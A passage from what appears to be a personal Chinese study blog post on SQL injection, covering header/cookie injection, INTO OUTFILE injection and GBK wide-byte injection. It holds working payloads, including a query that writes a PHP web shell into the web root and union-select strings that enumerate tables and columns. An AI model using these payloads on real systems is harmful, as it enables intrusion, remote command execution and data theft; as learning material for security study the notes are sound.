important">?></span></span></pre></td></tr></table></figure><p>然后就抓包，直接去 cookie 里找 user_id，使用其他注入方式</p>
<p>类似的，<strong>请求头的各个位置都有可能可以注入</strong></p>
<h2 id="八outfile_sql注入"><a class="anchor" href="#八outfile_sql注入">#</a> 八.outfile_sql 注入</h2>
<p><strong>MySQL 如果没有写入权限，想都不要想这玩意儿</strong></p>
<p>这是一个关键字，基本语法</p>
<pre><code class="language-mysql">SELECT ... INTO OUTFILE 
</code></pre>
<p>于是可以：</p>
<pre><code class="language-mysql">1;SELECT '&lt;?php system($_GET[&quot;cmd&quot;]);?&gt;' INTO OUTFILE '/var/www/html/shell.php'; --
</code></pre>
<p>这样，如果我们执行了这个 php 文件（所以你写的必须放在这个网站的根目录，通常是 /var/www/html/），就可以使用</p>
<p><code>http://example.com/shell.php?cmd=ls</code>  来执行系统命令。</p>
<p>万一不知道路径？</p>
<p>可以先联合注入：</p>
<pre><code class="language-mysql">'union select 1,@@basedir,@@datadir #
</code></pre>
<p><code>@@basedir</code> 	系统变量，是 MySQL 的安装路径</p>
<p><code>@@datadir</code> 	系统变量，是 MySQL 的文件路径</p>
<p>（都是绝对路径）</p>
<p>EX. 配置环境</p>
<p>在 MYSQL 安装目录下的 my.ini，增加一个：secure-file-priv=&quot;&quot;</p>
<p><strong>重启生效</strong></p>
<p>可以用 sql 命令：</p>
<p>show variables like &quot;secure_file_priv&quot; 或 show variables like &quot;secure_file_priv&quot;</p>
<p>来查看当前设置，NULL 表示禁止导入导出，空表示不限制，</p>
<p>若值为 /tmp/，表示限制 mysqld 的导入、导出只能发生在 /tmp/ 目录</p>
<h2 id="九宽字节注入"><a class="anchor" href="#九宽字节注入">#</a> 九。宽字节注入</h2>
<p>仅限数据库时 GBK 编码和后端进行 \ 转义</p>
<p>此时闭合用的 %27（单引号）改成 % df%27（GBK 编码下是个汉字）</p>
<p>因为汉字双字节，所以 PHP 转义的 \ 会被吃掉</p>
<p>然后联合查询</p>
<p>注意：由于 ' 被转义</p>
<p>table_schema=' 库名'</p>
<p>要改为嵌套查询</p>
<p>table_schema=(select database())</p>
<p>例如：</p>
<pre><code class="language-mysql">id=20%df%27union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=(selectdatabase())%23
-- 查列
</code></pre>
<blockquote>
<pre><code class="language-mysql">id=20%df%27 union select 1,2,column_name from information_schema.columns where table_schema=(selectdatabase()) and table_name=(select table_name from information_schema.tables where table_schema=(select database()) limit 0,1)limit 0,1%23
</code></pre>
</blockquote>
<blockquote>
<p>这里就使用了三层嵌套，第一层是 table_schema，它代表库名的嵌套，第二层和第三层是 table_name 的嵌套，这里可以看到语句中有两个 limit，前一个 limit 控制表名的顺序，后一个则控制字段名的顺序。这里就可以查询到表中的字段信息，剩下的就是查询详细信息，这里就不做介绍</p>
</blockquote>
<p>在 PHP 中，通过 iconv () 进行编码转换时，也可能存在宽字符注入漏洞</p>
<div class="tags"><a href="/tags/SQL/" rel="tag"><i class="ic i-tag"></i>SQL</a></div></div><footer><div class="meta"><span class="item"><span class="icon"><i class="ic i-calendar-check"></i></span><span class="text">Edited on</span><time title="Modified: 2025-03-08 17:20:18" itemprop="dateModified" datetime="2025-03-08T17:20:18+08:00">2025-03-08</time></span></div><div id="copyright"><ul><li class="author"><strong>Post author: </strong>hojun<i class="ic i-at"><em>@</em></i>这就是--Potato</li><li class="link"><strong>Post link: </strong><a href="https://zhewanyiershinicheng.github.io/2025/02/04/SQL%E6%B3%A8%E5%85%A5/" title="SQL注入">https://zhewanyiershinicheng.github.io/2025/02/04/SQL注入/</a></li><li class="license"><strong>Copyright Notice: </strong>All articles in this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh"><i class="ic i-creative-commons"><em>(CC)</em></i>BY-NC-SA</a> unless stating additionally.</li></ul></div></footer></article></div><div class="post-nav"><div class="item left"><a href="/2025/01/22/Linux/" rel="prev" itemprop="url" title="Linux" style="background-image: linear-gradient(to bottom right, #e9cbd4, #8989e9);"><span class="type">Previous Post</span><span class="category"><i class="ic i-flag"></i>技术</span><h3>Linux</h3></a></div><div class="item right"><a href="/2025/02/05/XSS/" rel="next" itemprop="url" title="XSS" style="background-image: linear-gradient(to bottom right, #da93b7, #aa9691);"><span class="type">Next Post</span><span class="category"><i class="ic i-flag"></i>技术</span><h3>XSS</h3></a></div></div><div class="wrap" id="comments"></div></div><div id="sidebar"><div class="inner"><div class="panels"><div class="inner"><div class="contents panel pjax" data-title="Contents"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%87%8D%E8%A6%81%E7%9A%84%E7%8E%A9%E6%84%8F%E5%84%BF"><span class="toc-number">1.</span> <span class="toc-text"> 重要的玩意儿</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%9B%B4%E6%8E%A5%E5%A5%97%E7%94%A8"><span class="toc-number">2.</span> <span class="toc-text"> 直接套用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8"><span class="toc-number">2.1.</span> <span class="toc-text"> 时间盲注</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8"><span class="toc-number">2.2.</span> <span class="toc-text"> 布尔盲注</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%9B%B6%E7%BB%95%E8%BF%87%E6%96%B9%E5%BC%8F"><span class="toc-number">3.</span> <span class="toc-text"> 零。绕过方式</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5"><span class="toc-number">4.</span> <span class="toc-text"> 一。联合注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A0%BC%E5%BC%8F"><span class="toc-number">4.1.</span> <span class="toc-text"> 格式</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%80%E4%BA%9B%E5%B0%8F%E9%83%A8%E4%BB%B6"><span class="toc-number">4.2.</span> <span class="toc-text"> 一些小部件</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1order-by"><span class="toc-number">4.2.1.</span> <span class="toc-text"> 1.order by</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2concat"><span class="toc-number">4.2.2.</span> <span class="toc-text"> 2.concat</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3group_concat"><span class="toc-number">4.2.3.</span> <span class="toc-text"> 3.group_concat</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4group-by"><span class="toc-number">4.2.4.</span> <span class="toc-text"> 4.group by</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#5substr"><span class="toc-number">4.2.5.</span> <span class="toc-text"> 5.substr</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#6ascll"><span class="toc-number">4.2.6.</span> <span class="toc-text"> 6.ascll</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#7database"><span class="toc-number">4.2.7.</span> <span class="toc-text"> 7.database()</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B5%81%E7%A8%8B"><span class="toc-number">4.3.</span> <span class="toc-text"> 流程</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%8C%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="toc-number">5.</span> <span class="toc-text"> 二。报错注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1updatexml"><span class="toc-number">5.1.</span> <span class="toc-text"> 1.updatexml()</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%A8%A1%E6%9D%BF"><span class="toc-number">5.1.1.</span> <span class="toc-text"> 模板</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%AF%AD%E6%B3%95"><span class="toc-number">5.1.2.</span> <span class="toc-text"> 语法</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8E%9F%E7%90%86"><span class="toc-number">5.1.3.</span> <span class="toc-text"> 原理</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2extractvalue"><span class="toc-number">5.2.</span> <span class="toc-text"> 2.extractvalue()</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%A8%A1%E6%9D%BF-2"><span class="toc-number">5.2.1.</span> <span class="toc-text"> 模板</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%AF%AD%E6%B3%95-2"><span class="toc-number">5.2.2.</span> <span class="toc-text"> 语法</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%89%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8"><span class="toc-number">6.</span> <span class="toc-text"> 三。布尔盲注</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B5%81%E7%A8%8B-2"><span class="toc-number">6.1.</span> <span class="toc-text"> 流程</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1%E6%9F%A5%E6%95%B0%E6%8D%AE%E5%BA%93"><span class="toc-number">6.1.1.</span> <span class="toc-text"> 1. 查数据库</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2%E6%9F%A5%E8%A1%A8"><span class="toc-number">6.1.2.</span> <span class="toc-text"> 2. 查表</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3%E6%9F%A5%E5%AD%97%E6%AE%B5"><span class="toc-number">6.1.3.</span> <span class="toc-text"> 3. 查字段</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4%E6%9F%A5%E6%95%B0%E6%8D%AE"><span class="toc-number">6.1.4.</span> <span class="toc-text"> 4. 查数据</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A4%E6%96%AD"><span class="toc-number">6.2.</span> <span class="toc-text"> 判断</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9B%9B%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8"><span class="toc-number">7.</span> <span class="toc-text"> 四。时间盲注</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%94%E5%A0%86%E5%8F%A0%E6%9F%A5%E8%AF%A2%E6%B3%A8%E5%85%A5"><span class="toc-number">8.</span> <span class="toc-text"> 五。堆叠查询注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A8%A1%E6%9D%BF-3"><span class="toc-number">8.1.</span> <span class="toc-text"> 模板</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B5%81%E7%A8%8Bselect%E8%A2%AB%E8%BF%87%E6%BB%A4"><span class="toc-number">8.2.</span> <span class="toc-text"> 流程（select 被过滤）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8E%9F%E7%90%86-2"><span class="toc-number">8.3.</span> <span class="toc-text"> 原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ex%E9%A2%84%E5%A4%84%E7%90%86%E8%AF%AD%E5%8F%A5"><span class="toc-number">8.4.</span> <span class="toc-text"> EX. 预处理语句</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%AD%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5"><span class="toc-number">9.</span> <span class="toc-text"> 六。二次注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%83cookie%E6%B3%A8%E5%85%A5"><span class="toc-number">10.</span> <span class="toc-text"> 七.cookie 注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%ABoutfile_sql%E6%B3%A8%E5%85%A5"><span class="toc-number">11.</span> <span class="toc-text"> 八.outfile_sql 注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B9%9D%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5"><span class="toc-number">12.</span> <span class="toc-text"> 九。宽字节注入</span></a></li></ol></div><div class="related panel pjax" data-title="Related"><ul><li ><a href="/2024/10/11/MySQL/" rel="bookmark" title="MySQL">MySQL</a></li><li ><a href="/2024/10/11/%E6%B1%87%E7%BC%96/" rel="bookmark" title="汇编">汇编</a></li><li ><a href="/2024/10/14/IDA%E7%9A%84%E4%BD%BF%E7%94%A8/" rel="bookmark" title="IDA">IDA</a></li><li ><a href="/2024/10/14/C%E7%AC%94%E8%AE%B02SE/" rel="bookmark" title="C笔记2SE">C笔记2SE</a></li><li ><a href="/2024/10/14/C%E7%AC%94%E8%AE%B01ultrasuper/" rel="bookmark" title="C笔记ultra">C笔记ultra</a></li><li ><a href="/2024/10/14/JavaScript/" rel="bookmark" title="JavaScript">JavaScript</a></li><li ><a href="/2024/10/14/HTML/" rel="bookmark" title="HTML">HTML</a></li><li ><a href="/2025/01/22/Linux/" rel="bookmark" title="Linux">Linux</a></li><li  class="active"><a href="/2025/02/04/SQL%E6%B3%A8%E5%85%A5/" rel="bookmark" title="SQL注入">SQL注入</a></li><li ><a href="/2025/02/05/XSS/" rel="bookmark" title="XSS">XSS</a></li><li ><a href="/2025/02/15/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" rel="bookmark" title="文件上传漏洞">文件上传漏洞</a></li></ul></div><div class="overview panel" data-title="Overview"><div class="author" itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><img class="image" loading="lazy" decoding="async" itemprop="image" alt="开船的" src="/assets/avatar.jpg"/><p class="name" itemprop="name">开船的</p><div class="description" itemprop="description">bug依旧很多，反正我忍不了</div></div><nav class="state"><div class="item posts"><a href="/archives/"><span class="count">17</span><span class="name">posts</span></a></div><div class="item categories"><a href="/categories/"><span class="count">3</span><span class="name">categories</span></a></div><div class="item tags"><a href="/tags/"><span class="count">4</span><span class="name">tags</span></a></div></nav><div class="social"><a target="_blank" rel="noopener" href="https://github.com/zhewanyiershinicheng" class="item github" title="https:&#x2F;&#x2F;github.com&#x2F;zhewanyiershinicheng"><i class="ic i-github"></i></a></div><div class="menu"><li class="item"><a href="/" rel="section"><i class="ic i-home"></i>Home</a></li><li class="item dropdown"><a href="#" onclick="return false;"><i class="ic i-feather"></i>Posts</a><ul class="submenu"><li class="item"><a href="/archives/" rel="section"><i class="ic i-list-alt"></i>Archives</a></li><li class="item"><a href="/categories/" rel="section"><i class="ic i-th"></i>Categories</a></li><li class="item"><a href="/tags/" rel="section"><i class="ic i-tags"></i>Tags</a></li></ul></li><li class="item"><a href="/friends/" rel="section"><i class="ic i-heart"></i>Friends</a></li></div></div></div></div><ul id="quick"><li class="prev pjax"><a href="/2025/02/05/XSS/" rel="prev" title="Previous Post"><i class="ic i-chevron-left"></i></a></li><li class="up"><i class="ic i-arrow-up"></i></li><li class="down"><i class="ic i-arrow-down"></i></li><li class="next pjax"><a href="/2025/01/22/Linux/" rel="next" title="Next Post"><i class="ic i-chevron-right"></i></a></li><li class="percent"></li></ul></div></div><div class="dimmer"></div></div></main><footer id="footer"><div class="inner"><div class="widgets"><div class="rpost pjax"><h2>Random Posts</h2><ul><li class="item"><div class="breadcrumb"></div><span><a href="/2025/03/20/flask/">flask</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/%E6%8A%80%E6%9C%AF/" title="In技术">技术</a></div><span><a href="/2025/02/15/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/">文件上传漏洞</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/%E6%8A%80%E6%9C%AF/" title="In技术">技术</a></div><span><a href="/2025/02/05/XSS/">XSS</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/%E6%8A%80%E6%9C%AF/" title="In技术">技术</a></div><span><a href="/2024/10/11/MySQL/">MySQL</a></span></li><li class="item"><div class="breadcrumb"></div><span><a href="/2024/10/11/%E5%9C%9F%E8%B1%86%E7%9B%B4%E6%92%AD%EF%BC%81%EF%BC%81%EF%BC%81%EF%BC%81%EF%BC%81%EF%BC%81/">土豆直播</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/%E6%8A%80%E6%9C%AF/" title="In技术">技术</a></div><span><a href="/2024/10/14/JavaScript/">JavaScript</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/%E6%8A%80%E6%9C%AF/" title="In技术">技术</a></div><span><a href="/2024/10/14/IDA%E7%9A%84%E4%BD%BF%E7%94%A8/">IDA</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/%E6%8A%80%E6%9C%AF/" title="In技术">技术</a></div><span><a href="/2025/01/22/Linux/">Linux</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/%E7%A6%BB%E8%B0%B1/" title="In离谱">离谱</a></div><span><a href="/2024/10/11/%E5%9C%9F%E8%B1%86%E8%B1%86%E8%B1%86%E8%B1%86%E8%B1%86/">土豆豆豆豆豆</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/%E6%8A%80%E6%9C%AF/" title="In技术">技术</a></div><span><a href="/2024/10/14/C%E7%AC%94%E8%AE%B02SE/">C笔记2SE</a></span></li></ul></div><div class="rpost pjax"><h2>Recent Comments</h2></div></div><div class="status"><div class="copyright">&copy; 2022 -<span itemprop="copyrightYear">2025</span><span class="with-love"><i class="ic i-sakura rotate"></i></span><span class="author" itemprop="copyrightHolder">开船的 @ tamato</span></div><div class="count"><span class="post-meta-item-icon"><i class="ic i-chart-area"></i></span><span title="Symbols count total">135k words</span><span class="post-meta-divider"> | </span><span class="post-meta-item-icon"><i class="ic i-coffee"></i></span><span title="Reading time total">2:03</span></div><div class="powered-by">Powered by <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a> & Theme.<a target="_blank" rel="noopener" href="https://github.com/theme-shoka-x/hexo-theme-shokaX/">ShokaX</a></div></div></div></footer></div><script data-config type="text/javascript">var LOCAL = {
    ispost: true,
        path: `2025/02/04/SQL注入/`,
        favicon: {
        show: `(●´3｀●) Here we go again.`,
        hide: `(´Д｀) It's a disaster!`
    },
    search: {
        placeholder: "Search for Posts",
        empty: "We didn't find any results for the search: ${query}",
        stats: "${hits} results found in ${time} ms"
    },
    copy_tex: false,
    katex: false,
    mermaid: false,
    audio: undefined,
    fancybox: true,
    nocopy: false,
    outime: true,
    template: `<div class="note warning"><p><span class="label warning">Article Timeliness Alert</span><br>This is an article published {{publish}} days ago and last updated {{updated}} days ago. Some information may have changed, so please be careful to screen it.</p></div>`,
    quiz: {
        choice: `Multiple Choice`,
        multiple: `Multiple Answer`,
        true_false: `True/False`,
        essay: `Questions`,
        gap_fill: `Gap Filling`,
        mistake: `Wrong Answer`
    },
    ignores: [
        (uri) => uri.includes('#'),
        (uri) => new RegExp(LOCAL.path + '$').test(uri),
            []
    ]
};
</script><script src="https://s4.zstatic.net/ajax/libs/pace/1.2.4/pace.min.js" integrity="sha384-k6YtvFUEIuEFBdrLKJ3YAUbBki333tj1CSUisai5Cswsg9wcLNaPzsTHDswp4Az8" crossorigin="anonymous" fetchpriority="high"></script><script src="https://s4.zstatic.net/ajax/libs/jquery/3.5.1/jquery.min.js" integrity="sha384-ZvpUoO&#x2F;+PpLXR1lu4jmpXWu80pZlYUAfxl5NsBMWOEPSjUn&#x2F;6Z&#x2F;hRTt8+pR6L4N2" crossorigin="anonymous" fetchpriority="high"></script><script src="/js/siteInit.js?v=0.4.17" type="module" fetchpriority="high" defer></script></body></html>